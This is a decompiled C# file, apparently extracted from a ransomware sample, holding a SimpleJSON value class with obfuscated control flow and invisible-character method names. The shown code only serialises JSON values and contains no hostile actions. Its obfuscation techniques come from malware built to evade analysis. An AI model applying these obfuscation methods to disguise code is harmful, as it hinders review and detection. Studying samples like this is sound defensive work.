// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONData
// Assembly: DigitShap, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AB9237C5-7B14-44B1-B37B-A2ADF34FB693
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-ed844cfae2c80b291651f15b71e1c0608612446513cb527a5753bfa831a2e348.exe

using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONData : JSONNode
  {
    private string m_Data;

    public override string Value
    {
      get => this.m_Data;
      set => this.m_Data = value;
    }

    public JSONData(string aData) => this.m_Data = aData;

    public JSONData(float aData)
    {
label_1:
      int num1 = -1588247545;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -685563426)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -1204921859 ^ -1230104875;
            continue;
          case 3:
            this.AsFloat = aData;
            num1 = (int) num2 * 2139179490 ^ 2105178422;
            continue;
          case 4:
            num1 = (int) num2 * -513832488 ^ 1860315783;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONData(double aData)
    {
label_1:
      int num1 = 717492179;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 947555238)) % 5U)
        {
          case 0:
            num1 = (int) num2 * 1767503117 ^ 254507628;
            continue;
          case 1:
            this.AsDouble = aData;
            num1 = (int) num2 * 1488649756 ^ -988237803;
            continue;
          case 2:
            num1 = (int) num2 * -1319510023 ^ 739023556;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONData(bool aData) => this.AsBool = aData;

    public JSONData(int aData) => this.AsInt = aData;

    public override string ToString()
    {
label_1:
      int num1 = 758697571;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1520785693)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 53301843 ^ -21482415;
            continue;
          case 2:
            str = JSONData.\u200E‍⁯⁮⁯​‭‎‌‪‍‮‏‍⁮⁬⁪‭⁯‬⁬‬⁬‎‏‍‍‍‎⁭‮‬‎‮⁪‪‬‎‍‎‮("\"", JSONNode.Escape(this.m_Data), "\"");
            num1 = (int) num2 * -570447734 ^ -429078008;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 1179842452;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1775262974)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            str = JSONData.\u200E‍⁯⁮⁯​‭‎‌‪‍‮‏‍⁮⁬⁪‭⁯‬⁬‬⁬‎‏‍‍‍‎⁭‮‬‎‮⁪‪‬‎‍‎‮("\"", JSONNode.Escape(this.m_Data), "\"");
            num1 = (int) num2 * 1172825808 ^ 920743029;
            continue;
          case 3:
            num1 = (int) num2 * -1233207835 ^ 996861568;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override void Serialize(BinaryWriter aWriter)
    {
label_1:
      int num1 = -1668621574;
      JSONData jsonData;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -16327677)) % 37U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -1499361952 ^ -410961075;
            continue;
          case 2:
            jsonData = new JSONData("");
            jsonData.AsInt = this.AsInt;
            num1 = (int) num2 * -2037454126 ^ 1270829937;
            continue;
          case 3:
            num1 = (int) num2 * 1966700755 ^ 420857900;
            continue;
          case 4:
            num1 = (int) num2 * 1763483952 ^ 2055137508;
            continue;
          case 5:
            num1 = (int) num2 * -1594458730 ^ 1748229911;
            continue;
          case 6:
            num1 = (int) num2 * -1743324404 ^ -1731779932;
            continue;
          case 7:
            num1 = (int) num2 * 414220501 ^ -1452029100;
            continue;
          case 8:
            JSONData.\u206C⁬⁪‏‫‪‏‎‬‬⁯⁯⁮‎‮‪⁬⁭⁬‬‎‍⁪​⁭‮‭‍⁮‮‪​⁬⁬‍‎‎⁯⁪⁫‮(aWriter, this.AsFloat);
            num1 = (int) num2 * -741080184 ^ -1395987421;
            continue;
          case 9:
            num1 = (int) num2 * 1176593021 ^ 2006138506;
            continue;
          case 10:
            jsonData.AsDouble = this.AsDouble;
            num1 = -1458964866;
            continue;
          case 11:
            int num3 = flag ? 1980927224 : (num3 = 1823932203);
            num1 = num3 ^ (int) num2 * -1159199055;
            continue;
          case 12:
            goto label_1;
          case 13:
            int num4 = !JSONData.\u202E‌‎⁬‫⁬⁬⁭‬‬‭⁪‍⁭‭⁬⁭⁮​‮⁫‭⁫‫⁮⁮⁪⁬‬​‬⁯‏⁪‪‍⁮⁮⁮‮‮(jsonData.m_Data, this.m_Data) ? -830062898 : (num4 = -1721745080);
            num1 = num4 ^ (int) num2 * -601947009;
            continue;
          case 14:
            flag = JSONData.\u202E‌‎⁬‫⁬⁬⁭‬‬‭⁪‍⁭‭⁬⁭⁮​‮⁫‭⁫‫⁮⁮⁪⁬‬​‬⁯‏⁪‪‍⁮⁮⁮‮‮(jsonData.m_Data, this.m_Data);
            num1 = (int) num2 * 49692605 ^ -1603657798;
            continue;
          case 15:
            JSONData.\u200C⁬‬⁪‍⁫​‫⁮‏​‫⁪‎⁬‬⁭⁯⁭‌⁪⁬‍⁯⁫‌⁯⁭‪⁪‍⁮⁬⁯⁬⁯⁮‬⁯‬‮(aWriter, (byte) 7);
            num1 = (int) num2 * 184666401 ^ -714864435;
            continue;
          case 16:
            num1 = (int) num2 * 1019100931 ^ -1868723409;
            continue;
          case 17:
            int num5 = JSONData.\u202E‌‎⁬‫⁬⁬⁭‬‬‭⁪‍⁭‭⁬⁭⁮​‮⁫‭⁫‫⁮⁮⁪⁬‬​‬⁯‏⁪‪‍⁮⁮⁮‮‮(jsonData.m_Data, this.m_Data) ? -32481614 : (num5 = -117613337);
            num1 = num5 ^ (int) num2 * 467496957;
            continue;
          case 18:
            JSONData.\u200C⁬‬⁪‍⁫​‫⁮‏​‫⁪‎⁬‬⁭⁯⁭‌⁪⁬‍⁯⁫‌⁯⁭‪⁪‍⁮⁬⁯⁬⁯⁮‬⁯‬‮(aWriter, (byte) 5);
            num1 = (int) num2 * -1948200106 ^ -50984038;
            continue;
          case 19:
            num1 = (int) num2 * 1465469326 ^ -1779891410;
            continue;
          case 20:
            JSONData.\u202B​‬⁮‭⁭⁫⁬‪⁯‬​‬⁬⁮‍​⁯⁫⁮‬‍‏‌‮⁮‏⁯⁪‫‮⁬⁬‫⁫‮‎‫‬⁮‮(aWriter, this.AsDouble);
            num1 = (int) num2 * 1054545840 ^ 1495185848;
            continue;
          case 21:
            num1 = (int) num2 * 854764220 ^ 908082372;
            continue;
          case 22:
            JSONData.\u200E⁭‭⁯‪⁯⁭‌‎‮⁮⁪​‍‫‎⁭⁮‎‏⁪‪‌⁫‬⁬⁬‏​​‫‏⁯⁮‍⁪‌⁬⁬⁮‮(aWriter, this.AsInt);
            num1 = (int) num2 * -169444993 ^ -1464044368;
            continue;
          case 23:
            JSONData.\u202E‌⁭‌‬‏‮‏⁫⁬⁯‍‌‪‪⁫⁯‏⁮‌​⁫‌‏⁮‭‍⁫⁯​⁭‮⁯​‮‍‫⁬‭‎‮(aWriter, this.m_Data);
            num1 = (int) num2 * -81917671 ^ 2028468038;
            continue;
          case 24:
            jsonData.AsFloat = this.AsFloat;
            num1 = -1762409251;
            continue;
          case 25:
            num1 = (int) num2 * 1296930801 ^ 331075198;
            continue;
          case 26:
            int num6 = !JSONData.\u202E‌‎⁬‫⁬⁬⁭‬‬‭⁪‍⁭‭⁬⁭⁮​‮⁫‭⁫‫⁮⁮⁪⁬‬​‬⁯‏⁪‪‍⁮⁮⁮‮‮(jsonData.m_Data, this.m_Data) ? -1712253419 : (num6 = -906580970);
            num1 = num6 ^ (int) num2 * 310393275;
            continue;
          case 27:
            JSONData.\u200C⁬‬⁪‍⁫​‫⁮‏​‫⁪‎⁬‬⁭⁯⁭‌⁪⁬‍⁯⁫‌⁯⁭‪⁪‍⁮⁬⁯⁬⁯⁮‬⁯‬‮(aWriter, (byte) 4);
            num1 = (int) num2 * -1543813701 ^ -1455293092;
            continue;
          case 28:
            JSONData.\u206B⁬‫‏‌‬⁮‫​‭‭‎‫⁫⁭⁮‍⁬‮‌‭⁭⁫⁬⁮⁮‍​‎‭⁫‎‭‎‫‬‭‏‬‭‮(aWriter, this.AsBool);
            num1 = (int) num2 * -2084144885 ^ -1939158693;
            continue;
          case 29:
            JSONData.\u200C⁬‬⁪‍⁫​‫⁮‏​‫⁪‎⁬‬⁭⁯⁭‌⁪⁬‍⁯⁫‌⁯⁭‪⁪‍⁮⁬⁯⁬⁯⁮‬⁯‬‮(aWriter, (byte) 6);
            num1 = (int) num2 * -1469985767 ^ 1384358761;
            continue;
          case 30:
            num1 = (int) num2 * 1006496706 ^ -1848441474;
            continue;
          case 31:
            num1 = (int) num2 * 72707073 ^ 627245889;
            continue;
          case 32:
            num1 = (int) num2 * 2114675231 ^ 2105859831;
            continue;
          case 33:
            num1 = (int) num2 * -630186490 ^ 647277413;
            continue;
          case 34:
            num1 = (int) num2 * -1854551878 ^ -1621617347;
            continue;
          case 35:
            JSONData.\u200C⁬‬⁪‍⁫​‫⁮‏​‫⁪‎⁬‬⁭⁯⁭‌⁪⁬‍⁯⁫‌⁯⁭‪⁪‍⁮⁬⁯⁬⁯⁮‬⁯‬‮(aWriter, (byte) 3);
            num1 = -1734062328;
            continue;
          case 36:
            jsonData.AsBool = this.AsBool;
            num1 = -1170805847;
            continue;
          default:
            goto label_39;
        }
      }
label_3:
      return;
label_39:;
    }

    static string \u200E‍⁯⁮⁯​‭‎‌‪‍‮‏‍⁮⁬⁪‭⁯‬⁬‬⁬‎‏‍‍‍‎⁭‮‬‎‮⁪‪‬‎‍‎‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static bool \u202E‌‎⁬‫⁬⁬⁭‬‬‭⁪‍⁭‭⁬⁭⁮​‮⁫‭⁫‫⁮⁮⁪⁬‬​‬⁯‏⁪‪‍⁮⁮⁮‮‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static void \u200C⁬‬⁪‍⁫​‫⁮‏​‫⁪‎⁬‬⁭⁯⁭‌⁪⁬‍⁯⁫‌⁯⁭‪⁪‍⁮⁬⁯⁬⁯⁮‬⁯‬‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u200E⁭‭⁯‪⁯⁭‌‎‮⁮⁪​‍‫‎⁭⁮‎‏⁪‪‌⁫‬⁬⁬‏​​‫‏⁯⁮‍⁪‌⁬⁬⁮‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);

    static void \u206C⁬⁪‏‫‪‏‎‬‬⁯⁯⁮‎‮‪⁬⁭⁬‬‎‍⁪​⁭‮‭‍⁮‮‪​⁬⁬‍‎‎⁯⁪⁫‮([In] BinaryWriter obj0, [In] float obj1) => obj0.Write(obj1);

    static void \u202B​‬⁮‭⁭⁫⁬‪⁯‬​‬⁬⁮‍​⁯⁫⁮‬‍‏‌‮⁮‏⁯⁪‫‮⁬⁬‫⁫‮‎‫‬⁮‮([In] BinaryWriter obj0, [In] double obj1) => obj0.Write(obj1);

    static void \u206B⁬‫‏‌‬⁮‫​‭‭‎‫⁫⁭⁮‍⁬‮‌‭⁭⁫⁬⁮⁮‍​‎‭⁫‎‭‎‫‬‭‏‬‭‮([In] BinaryWriter obj0, [In] bool obj1) => obj0.Write(obj1);

    static void \u202E‌⁭‌‬‏‮‏⁫⁬⁯‍‌‪‪⁫⁯‏⁮‌​⁫‌‏⁮‭‍⁫⁯​⁭‮⁯​‮‍‫⁬‭‎‮([In] BinaryWriter obj0, [In] string obj1) => obj0.Write(obj1);
  }
}
